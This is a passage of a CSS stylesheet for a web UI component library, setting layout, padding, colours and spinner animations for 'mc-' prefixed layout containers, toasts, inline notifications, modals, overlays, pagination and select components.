        mc-layout-aside-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-help-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-body-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-extra-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-side-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-footer-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-list-table.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+* {
            margin-left: 15px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-help-container.mc-layout-v2 .mc-layout-body-aside,
        mc-help-container.mc-layout-v2 .mc-layout-body-modal,
        mc-help-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-help-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-body-container.mc-layout-v2 .mc-layout-body-aside,
        mc-body-container.mc-layout-v2 .mc-layout-body-modal,
        mc-body-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-body-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-extra-container.mc-layout-v2 .mc-layout-body-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-extra-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-side-container.mc-layout-v2 .mc-layout-body-aside,
        mc-side-container.mc-layout-v2 .mc-layout-body-modal,
        mc-side-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-side-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-footer-container.mc-layout-v2 .mc-layout-body-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-body-modal,
        mc-footer-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-table.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-footer-container-modal {
            padding: 15px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-help-container.mc-layout-v2 .mc-layout-body-modal,
        mc-body-container.mc-layout-v2 .mc-layout-body-modal,
        mc-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-side-container.mc-layout-v2 .mc-layout-body-modal,
        mc-footer-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-modal {
            padding-top: 5px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-help-container.mc-layout-v2 .mc-layout-body-aside,
        mc-help-container.mc-layout-v2 .mc-layout-body-modal,
        mc-help-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-help-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-body-container.mc-layout-v2 .mc-layout-body-aside,
        mc-body-container.mc-layout-v2 .mc-layout-body-modal,
        mc-body-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-body-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-body-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-extra-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-extra-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-side-container.mc-layout-v2 .mc-layout-body-aside,
        mc-side-container.mc-layout-v2 .mc-layout-body-modal,
        mc-side-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-side-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-body-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-body-modal,
        mc-footer-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-footer-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-table.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-tabs-container-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-modal,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-tabs-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-tabs-container-aside {
            flex: 1 1 auto;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-help-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-body-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-extra-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-side-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-footer-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-modal .mc-description-item,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-modal .mc-description-item {
            flex: 1 1 auto;
            margin-bottom: 15px;
            font-size: 14px;
            color: #333333;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-help-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-body-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-extra-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-side-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-footer-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-list-table.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-detail-wizard .mc-layout-header {
            padding-bottom: 30px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-help-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-body-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-side-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-loader-full-container-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-loader-full-container-aside {
            display: flex !important;
            flex-direction: column;
            flex: 1 1 auto;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-help-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-body-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-extra-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-side-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-footer-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-flex-footer-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-flex-footer-container {
            flex: 0 0 auto;
            align-self: flex-end;
            border-top: 1px solid #CCCCCC;
        }

        mc-layout-aside-extra-container .mc-layout-body-aside>* {
            padding: 15px;
        }

        mc-layout-aside-extra-pagination-container .mc-layout-body-aside>* {
            padding: 15px;
        }

        mc-layout-aside-extra-pagination-container .mc-item-container {
            background-color: #F2F2F2;
        }

        mc-loader-panel-container .mc-loader-panel-container {
            border: 1px solid #CCCCCC;
            border-radius: 6px;
        }

        mc-loader-panel-container .mc-loader-panel-container.with-padding {
            padding: 15px;
        }

        mc-loader-panel-container .mc-loader-panel-container .mc-loader-panel-container-title {
            display: flex;
            font-size: 23px;
            font-weight: 400;
            padding-bottom: 7.5px;
            word-break: break-all;
        }

        mc-loader-panel-container .mc-loader-panel-container .mc-loader-panel-container-title .mc-loader-panel-container-spinner {
            flex: 0;
            font-size: 2.5rem;
            padding-right: 7.5px;
        }

        mc-loader-panel-container .mc-loader-panel-container .mc-loader-panel-container-title .mc-loader-panel-container-title-text {
            align-self: center;
        }

        mc-loader-panel-container .mc-loader-panel-container .mc-loader-panel-container-description {
            font-weight: 400;
            padding-bottom: 7.5px;
        }

        mc-loader-panel-container .mc-loader-panel-container .mc-loader-panel-container-body {
            padding-top: 7.5px;
        }

        mc-message-detail-header {
            display: flex;
        }

        mc-message-detail-header .mc-title,
        mc-message-detail-header .mc-label {
            font-size: 17px;
            font-weight: 700;
        }

        mc-message-detail-header .mc-title {
            flex: 1;
            white-space: nowrap;
            overflow-x: hidden;
            text-overflow: ellipsis;
        }

        mc-message-detail-header .mc-label {
            color: #666666;
        }

        mc-message-detail-header .mc-message-paginator {
            display: inline-flex;
            padding-left: 15px;
            margin-left: auto;
        }

        mc-inline-notification {
            color: #333333;
        }

        mc-inline-notification .actions a,
        mc-inline-notification .message ::ng-deep a {
            color: #333333;
        }

        mc-inline-notification .ribbon {
            border-radius: 6px 0 0 6px;
        }

        mc-inline-notification .content ::ng-deep a {
            color: #333333;
        }

        mc-inline-notification .info {
            border-color: #3a98d8;
            color: #3a98d8;
        }

        mc-inline-notification .info .ribbon {
            background: #3a98d8;
        }

        mc-inline-notification .success {
            border-color: #50b450;
            color: #50b450;
        }

        mc-inline-notification .success .ribbon {
            background: #50b450;
        }

        mc-inline-notification .warning {
            border-color: #E5B700;
            color: #997A00;
        }

        mc-inline-notification .warning .ribbon {
            background: #E5B700;
        }

        mc-inline-notification .error {
            border-color: #d63636;
            color: #d63636;
        }

        mc-inline-notification .error .ribbon {
            background: #d63636;
        }

        mc-inline-notification .box {
            border-radius: 6px;
            color: #333333;
        }

        mc-toast .toast {
            border-radius: 6px;
            background: #ffffff;
        }

        @media (min-width: 768px) {
            mc-toast .toast {
                min-width: 350px;
            }
        }

        mc-toast .ribbon {
            border-radius: 6px 0 0 6px;
        }

        mc-toast .info {
            border-color: #3a98d8;
        }

        mc-toast .info .ribbon {
            background: #3a98d8;
        }

        mc-toast .success {
            border-color: #50b450;
        }

        mc-toast .success .ribbon {
            background: #50b450;
        }

        mc-toast .warning {
            border-color: #E5B700;
        }

        mc-toast .warning .ribbon {
            background: #E5B700;
        }

        mc-toast .error {
            border-color: #d63636;
        }

        mc-toast .error .ribbon {
            background: #d63636;
        }

        mc-toast .content {
            font-size: 14px;
            line-height: 1.42857143;
        }

        mc-toast .content .btn,
        mc-toast .content .link {
            font-size: 11px;
            font-weight: 400;
        }

        mc-toast .content a {
            color: #333333;
        }

        .cdk-overlay-container {
            position: fixed;
            z-index: 1040;
        }

        .cdk-global-overlay-wrapper {
            display: flex;
            flex-direction: column;
            position: fixed;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            z-index: 1040;
            overflow-x: hidden;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            pointer-events: none;
        }

        .cdk-overlay-pane {
            box-sizing: border-box;
            z-index: 1040;
            pointer-events: auto;
        }

        .cdk-overlay-backdrop {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            z-index: 1040;
            pointer-events: auto;
            -webkit-tap-highlight-color: transparent;
            transition: opacity 400ms cubic-bezier(0.25, 0.8, 0.25, 1);
            opacity: 0;
        }

        .cdk-overlay-backdrop.cdk-overlay-backdrop-showing {
            opacity: 1;
        }

        .cdk-overlay-dark-backdrop {
            background: rgba(0, 0, 0, 0.6);
        }

        .cdk-overlay-transparent-backdrop {
            background: none;
        }

        .cdk-overlay-inverted-backdrop {
            background: rgba(255, 255, 255, 0.6);
        }

        .cdk-global-scrollblock {
            position: fixed;
            width: 100%;
            overflow-y: scroll;
        }

        .overlay-container {
            width: 100%;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.25);
        }

        floating-button-panel {
            width: 100%;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.25);
            background-color: #fff;
            border-radius: 4px;
        }

        .cdk-overlay-pane.type-modal {
            padding: 15px;
        }

        .cdk-overlay-pane.type-modal .overlay-container {
            border-radius: 6px;
        }

        mc-modal-body {
            padding: 0 15px;
        }

        mc-modal-footer {
            padding: 15px;
        }

        mc-modal-header {
            font-size: 17px;
            font-weight: normal;
            padding: 15px;
            border-radius: 4px 4px 0 0;
        }

        .mc-sub-title {
            font-size: 14px;
        }

        .close-btn {
            color: #666666;
        }

        mc-page-header .mc-title-container .mc-title {
            font-size: 23px;
            font-weight: 400;
        }

        mc-page-header .mc-title-container .mc-subtitle {
            font-size: 14px;
        }

        mc-pagination .mc-pagination button[disabled] {
            border-color: #CCCCCC;
        }

        mc-pagination .mc-pagination button[disabled]>i {
            color: #999999;
        }

        mc-rating .rating ngb-rating .outline {
            color: #CCCCCC;
        }

        mc-rating .rating ngb-rating .hover-filled {
            color: #FFD633;
        }

        mc-rating .rating ngb-rating .selected-filled {
            color: #ffcc00;
        }

        mc-select-searchable .mc-select-searchable .mc-no-results {
            color: #999999;
        }

        mc-select-searchable .mc-select-searchable .mc-select-searchable-button {
            border-radius: 4px;
            text-decoration: none;
        }

        mc-select-searchable .mc-select-searchable .mc-select-searchable-button:focus {
            background: none;
        }

        mc-select-searchable .mc-select-searchable .mc-select-chevron {
            margin-left: 5px;
            padding-left: 6px;
        }

        mc-select-searchable .mc-select-searchable .mc-select-searchable-modal .mc-select-searchable-list-container .mc-select-searchable-search {
            border-bottom-color: #E5E5E5;
        }

        mc-select-searchable .mc-select-searchable .mc-select-searchable-modal .mc-select-searchable-list-container .mc-select-searchable-search input {
            border: none;
        }

        mc-select-searchable .mc-select-searchable .mc-select-searchable-modal .mc-select-searchable-list-container .mc-select-searchable-search .mc-icon {
            background-color: #fff;
            color: #999999;
        }

        mc-option .mc-option {
            padding: 6px 12px;
            color: #333333;
        }

        mc-option .mc-option:hover {
            background-color: #F2F2F2;
            color: #262626;
        }

        mc-option .dropdown-header {
            padding: 3px 12px;
        }

        mc-option .mc-divider {
            background-color: #E5E5E5;
        }

        .mc-spinner svg {
            fill: #333333;
            vertical-align: top;
        }

        .mc-spinner svg path.s1 {
            animation: pulse_v2 1s infinite linear;
        }

        .mc-spinner svg path.s2 {
            animation: pulse_v2 1s -0.083s infinite linear;
        }

        .mc-spinner svg path.s3 {
            animation: pulse_v2 1s -0.166s infinite linear;
        }

        .mc-spinner svg path.s4 {
            animation: pulse_v2 1s -0.249s infinite linear;
        }

        .mc-spinner svg path.s5 {
            animation: pulse_v2 1s -0.332s infinite linear;
        }

        .mc-spinner svg path.s6 {
            animation: pulse_v2 1s -0.415s infinite linear;
        }

        .mc-spinner svg path.s7 {
            animation: pulse_v2 1s -0.498s infinite linear;
        }

        .mc-spinner svg path.s8 {
            animation: pulse_v2 1s -0.581s infinite linear;
        }

        .mc-spinner svg path.s9 {
            animation: pulse_v2 1s -0.664s infinite linear;
        }

        .mc-spinner svg path.s10 {
            animation: pulse_v2 1s -0.747s infinite linear;
        }

        .mc-spinner svg path.s11 {
            animation: pulse_v2 1s -0.83s infinite linear;
        }

        .mc-spinner svg path.s12 {
            animation: pulse_v2 1s -0.913s infinite linear;
        }

        .mc-spinner.mc-inverted svg {
            fill: #ffffff;
            vertical-align: top;
        }

        .mc-spinner.mc-inverted svg path.s1 {
            animation: inverted_pulse_v2 1s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s2 {
            animation: inverted_pulse_v2 1s -0.083s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s3 {
